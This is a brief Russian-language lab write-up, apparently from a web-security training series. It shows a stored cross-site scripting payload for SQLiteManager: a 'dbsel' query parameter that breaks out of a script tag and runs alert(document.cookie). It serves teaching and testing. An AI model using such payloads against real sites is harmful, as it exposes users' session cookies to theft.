---
title: Cross-Site Scripting - Stored (SQLiteManager)
---

# Cross-Site Scripting - Stored (SQLiteManager)

Переходим по ссылке и используем payload
```bash
?dbsel='"</script><script>alert(document.cookie)</script>
```
![](images/img_22.png)